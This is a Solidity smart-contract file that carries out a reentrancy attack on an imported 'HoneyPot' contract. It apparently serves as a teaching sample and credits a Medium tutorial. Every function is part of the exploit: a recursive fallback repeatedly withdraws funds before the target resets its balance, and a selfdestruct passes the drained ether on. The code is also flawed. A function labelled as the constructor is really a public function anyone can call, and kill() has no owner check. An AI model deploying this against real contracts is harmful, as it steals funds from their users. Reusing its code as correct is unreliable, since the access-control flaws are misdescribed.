pragma solidity ^0.4.8;

import "./HoneyPot.sol";

/**
AttackContract used to exploit HoneyPot contract taken from:
https://gus-tavo-guim.medium.com/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
 */
contract HoneyPotCollect {

    // reference honeypot contract
    HoneyPot public honeypot;  
    
    /**
    Constructor function takes in address of deployed honey pot function
    Assigns it to honeypot variable so that we have a reference to it
    and we can start calling honeypot contract functions.
     */
    function constructor (address _honeypot) public {
        honeypot = HoneyPot(_honeypot);
    }  

    /**
    Calling selfdestruct is negative gas and is cheaper than just address.send.
    selfdestruct sends whtaever ether is in this contract account to the address
    as an arguments.
     */
    function kill () {
        selfdestruct(msg.sender);
    }  

    /**
    This is the function that will set the reentrancy attack in motion
    It puts some ether into honeypot and then right after it gets the ether.
     */
    function collect() payable {
        honeypot.put.value(msg.value)();
        honeypot.get();
    }  
    
    /**
    Fallback function is called whenever honeypotcollect contract receives ether
    This is where the reentrancy attack occurs. So upon calling get() from collect, 
    when this contract receives ether, it checks for the remaining amount of ether in 
    the vulnerable contract account, if still have, then call get again. This is recursive 
    And will run before honeypot sets the balance to 0 as the check never completes as this is
    still running from the collect function.
    setting balance to 0 only comes after sending the transaction. As the transaction is not over due to 
    recursive callback via the fallback function, it tricks honeypot into
    sending money over and over again.
     */
    function () payable {
        if (honeypot.balance >= msg.value) {
            honeypot.get();
        }
    }
}